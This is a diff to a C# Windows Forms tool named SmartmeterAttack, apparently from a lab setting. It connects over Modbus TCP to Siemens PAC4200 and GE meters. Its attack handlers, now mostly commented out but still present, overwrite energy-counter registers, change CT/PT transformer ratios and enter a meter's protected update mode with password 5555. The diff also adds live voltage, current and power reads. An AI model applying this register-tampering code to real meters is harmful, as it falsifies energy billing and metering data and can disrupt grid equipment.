@@ -25,14 +25,12 @@ namespace SmartmeterAttack
         const int SampleTime1 = 1;
         const int SampleTime2 = 1;
         public TCPSGInterface TcpMeter1;
-        public TCPSGInterface TcpMeter2;
-        public TCPSGInterface TcpMeter3;
         bool bIsOpen = false;
         private System.Windows.Forms.Timer timer;
         private Random random=new Random();
         private Size _originalFormSize;
         private List<ControlEntity> _originalControlList = new List<ControlEntity>();
-
+        private byte[] res=new byte[20];
         public Form1()
         {
             InitializeComponent();
@@ -43,12 +41,83 @@ namespace SmartmeterAttack
             this.Resize += new System.EventHandler(this.Form1_Resize);
             this.Load += new System.EventHandler(this.Form1_Load);
         }
-        private void Timer_Tick(object sender, EventArgs e)
+        unsafe private void Timer_Tick(object sender, EventArgs e)
         {
-            float randomNumber = (float)(random.NextDouble()*100);
-            if(!bIsOpen)
+            float vv, cc, pp;
+            byte*[] add = new byte*[5];
+            if (bIsOpen)
             {
-                v_1.Text = randomNumber.ToString("0.00");
+                TcpMeter1.ReadHoldingRegisters(0x01, 0x0131, 0x0001, res);
+                vv = ((res[0] << 8) + res[1]) / (float)10.0;
+                v_1.Text = vv.ToString("0.00");
+                TcpMeter1.ReadHoldingRegisters(0x01, 0x0139, 0x0001, res);
+                cc = ((res[0] << 8) + res[1]) / (float)1000.0;
+                c_1.Text = cc.ToString("0.00");
+                TcpMeter1.ReadHoldingRegisters(0x01, 0x0146, 0x0001, res);
+                pp = ((res[0] << 8) + res[1]) / (float)1000.0;
+                p_1.Text = pp.ToString("0.00");
+                /////////////////////////////////////////////////////////////
+                TcpMeter1.ReadHoldingRegisters(0x05, 0x0001, 0x0002, res);
+                add[0] = (byte*)(&vv) + 3;
+                add[1] = (byte*)(&vv) + 2;
+                add[2] = (byte*)(&vv) + 1;
+                add[3] = (byte*)(&vv);
+                *add[0] = res[0];
+                *add[1] = res[1];
+                *add[2] = res[2];
+                *add[3] = res[3];
+                v_5.Text = vv.ToString("0.00");
+                TcpMeter1.ReadHoldingRegisters(0x05, 13, 0x0002, res);
+                add[0] = (byte*)(&cc) + 3;
+                add[1] = (byte*)(&cc) + 2;
+                add[2] = (byte*)(&cc) + 1;
+                add[3] = (byte*)(&cc);
+                *add[0] = res[0];
+                *add[1] = res[1];
+                *add[2] = res[2];
+                *add[3] = res[3];
+                c_5.Text = cc.ToString("0.00");
+                TcpMeter1.ReadHoldingRegisters(0x05, 63, 0x0002, res);
+                add[0] = (byte*)(&pp) + 3;
+                add[1] = (byte*)(&pp) + 2;
+                add[2] = (byte*)(&pp) + 1;
+                add[3] = (byte*)(&pp);
+                *add[0] = res[0];
+                *add[1] = res[1];
+                *add[2] = res[2];
+                *add[3] = res[3];
+                p_5.Text = pp.ToString("0.00");
+                ////////////////////////////////////////////////////////////////////////////
+                TcpMeter1.ReadHoldingRegisters(0x06, 0x0001, 0x0002, res);
+                add[0] = (byte*)(&vv) + 3;
+                add[1] = (byte*)(&vv) + 2;
+                add[2] = (byte*)(&vv) + 1;
+                add[3] = (byte*)(&vv);
+                *add[0] = res[0];
+                *add[1] = res[1];
+                *add[2] = res[2];
+                *add[3] = res[3];
+                v_6.Text = vv.ToString("0.00");
+                TcpMeter1.ReadHoldingRegisters(0x06, 13, 0x0002, res);
+                add[0] = (byte*)(&cc) + 3;
+                add[1] = (byte*)(&cc) + 2;
+                add[2] = (byte*)(&cc) + 1;
+                add[3] = (byte*)(&cc);
+                *add[0] = res[0];
+                *add[1] = res[1];
+                *add[2] = res[2];
+                *add[3] = res[3];
+                c_6.Text = cc.ToString("0.00");
+                TcpMeter1.ReadHoldingRegisters(0x06, 63, 0x0002, res);
+                add[0] = (byte*)(&pp) + 3;
+                add[1] = (byte*)(&pp) + 2;
+                add[2] = (byte*)(&pp) + 1;
+                add[3] = (byte*)(&pp);
+                *add[0] = res[0];
+                *add[1] = res[1];
+                *add[2] = res[2];
+                *add[3] = res[3];
+                p_6.Text = pp.ToString("0.00");
             }
         }
         private void Form1_Load(object sender, EventArgs e)
@@ -108,9 +177,7 @@ namespace SmartmeterAttack
             {
                 try
                 {
-                    TcpMeter1 = new TCPSGInterface("192.168.1.106");
-                    TcpMeter2 = new TCPSGInterface("192.168.1.107");
-                    TcpMeter3 = new TCPSGInterface("192.168.1.108");
+                    TcpMeter1 = new TCPSGInterface("192.168.1.254");
                     bIsOpen = true;
                     button2.Enabled = true;
                     button3.Enabled = true;
@@ -131,7 +198,6 @@ namespace SmartmeterAttack
                 try
                 {
                     TcpMeter1.close();
-                    TcpMeter2.close();
                     bIsOpen = false;
                     button2.Enabled = false;
                     button3.Enabled = false;
@@ -161,7 +227,7 @@ namespace SmartmeterAttack
         private void button2_Click(object sender, EventArgs e)
         {
 
-         
+         /*
             double E11new =  500000;
             double E12new = 1500000;
             double E21new = 1500000;
@@ -171,8 +237,6 @@ namespace SmartmeterAttack
             byte[] bholdregs2 = new byte[8];
             byte[] bholdregs3 = new byte[8];
             byte[] bholdregs4 = new byte[8];
-            
-            
             bholdregs1 = BitConverter.GetBytes(E11new);
             Array.Reverse(bholdregs1, 0, 8);
             bholdregs2 = BitConverter.GetBytes(E12new);
@@ -181,19 +245,17 @@ namespace SmartmeterAttack
             Array.Reverse(bholdregs3, 0, 8);
             bholdregs4 = BitConverter.GetBytes(E22new);
             Array.Reverse(bholdregs4, 0, 8);
-          
-            
             TcpMeter1.WriteMultipleRegisters(801, bholdregs1);
             TcpMeter1.WriteMultipleRegisters(805, bholdregs2);
             TcpMeter2.WriteMultipleRegisters(801, bholdregs3);
-            TcpMeter2.WriteMultipleRegisters(805, bholdregs4);
+            TcpMeter2.WriteMultipleRegisters(805, bholdregs4);*/
            
         }
 
         //攻击GE5500P
         private void button3_Click(object sender, EventArgs e)
         {
-            
+            /*
             //ushort Pass = 5555; CT=25，PT1=220，PT2=220
             ushort CT1_1new = 25;
             UInt32 PT1_1new = 2200;
@@ -210,7 +272,6 @@ namespace SmartmeterAttack
             byte[] bholdregs1_8 = new byte[4];
             byte[] bholdregs1_9 = new byte[2];
             byte[] bholdregs1_10 = new byte[2];
-
             bholdregs1_5 = BitConverter.GetBytes(PT1_1new);
             Array.Reverse(bholdregs1_5, 0, 4);
             bholdregs1_6 = BitConverter.GetBytes(CT1_1new);
@@ -223,20 +284,20 @@ namespace SmartmeterAttack
             Array.Reverse(bholdregs1_9, 0, 2);
             bholdregs1_10 = BitConverter.GetBytes(PT2_2new);
             Array.Reverse(bholdregs1_10, 0, 2);
-
             TcpMeter3.WriteMultipleRegistersQ(slaveID1, 261, bholdregs1_5);
             TcpMeter3.WriteMultipleRegistersP(slaveID1, 264, bholdregs1_6);
             TcpMeter3.WriteMultipleRegistersP(slaveID1, 263, bholdregs1_7);
             TcpMeter3.WriteMultipleRegistersQ(slaveID2, 261, bholdregs1_8);
             TcpMeter3.WriteMultipleRegistersP(slaveID2, 264, bholdregs1_9);
             TcpMeter3.WriteMultipleRegistersP(slaveID2, 263, bholdregs1_10);
-
+            */
 
         }
 
         //攻击GE2200
         private void button4_Click(object sender, EventArgs e)
         {
+            /*
             ushort Pass = 5555;
             ushort CT1new = 25;
             ushort PT1new = 240;
@@ -254,6 +315,7 @@ namespace SmartmeterAttack
             checksum = BitConverter.ToUInt16(bholdregs11, 0);
             TcpMeter3.WriteSingleRegisters(slaveID3, 22002, checksum);
             TcpMeter3.WriteSingleRegisters(slaveID3, 22000, checksum);// out PS update mode
+            */
 
         }
 
@@ -285,8 +347,6 @@ namespace SmartmeterAttack
 
             TcpMeter1.WriteMultipleRegisters(801, bholdregs1);
             TcpMeter1.WriteMultipleRegisters(805, bholdregs2);
-            TcpMeter2.WriteMultipleRegisters(801, bholdregs3);
-            TcpMeter2.WriteMultipleRegisters(805, bholdregs4);
         }
 
         //重置GE5500P
@@ -321,12 +381,6 @@ namespace SmartmeterAttack
             bholdregs1_10 = BitConverter.GetBytes(PT2_2new);
             Array.Reverse(bholdregs1_10, 0, 2);
 
-            TcpMeter3.WriteMultipleRegistersQ(slaveID1, 261, bholdregs1_5);
-            TcpMeter3.WriteMultipleRegistersP(slaveID1, 264, bholdregs1_6);
-            TcpMeter3.WriteMultipleRegistersP(slaveID1, 263, bholdregs1_7);
-            TcpMeter3.WriteMultipleRegistersQ(slaveID2, 261, bholdregs1_8);
-            TcpMeter3.WriteMultipleRegistersP(slaveID2, 264, bholdregs1_9);
-            TcpMeter3.WriteMultipleRegistersP(slaveID2, 263, bholdregs1_10);
         }
 
         //resetGE2200
@@ -340,28 +394,21 @@ namespace SmartmeterAttack
 
             byte[] bholdregs11 = new byte[2];
 
-
-            TcpMeter3.WriteSingleRegisters(slaveID3, 21999, Pass);// in PS update mode
-            TcpMeter3.WriteSingleRegisters(slaveID3, 30000, CT1new);
-            TcpMeter3.WriteSingleRegisters(slaveID3, 30001, PT1new);
-            TcpMeter3.ReadHoldingRegisters(slaveID3, 22001, 1, bholdregs11);
             Array.Reverse(bholdregs11, 0, 2);
             checksum = BitConverter.ToUInt16(bholdregs11, 0);
-            TcpMeter3.WriteSingleRegisters(slaveID3, 22002, checksum);
-            TcpMeter3.WriteSingleRegisters(slaveID3, 22000, checksum);// out PS update mode
         }
 
         //重置所有电表
         private void button5_Click(object sender, EventArgs e)
         {
-            resetPAC4200();
-            resetGE5500P();
-            resetGE2200();
+            //resetPAC4200();
+            //resetGE5500P();
+            //resetGE2200();
         }
 
         private void button6_Click(object sender, EventArgs e)
         {
-            resetPAC4200();
+            //resetPAC4200();
         }
 
         private void label1_Click(object sender, EventArgs e)
@@ -371,12 +418,12 @@ namespace SmartmeterAttack
 
         private void button7_Click(object sender, EventArgs e)
         {
-            resetGE5500P();
+           // resetGE5500P();
         }
 
         private void button8_Click(object sender, EventArgs e)
         {
-            resetGE2200();
+           // resetGE2200();
         }
 
         private void groupBox1_Enter(object sender, EventArgs e)
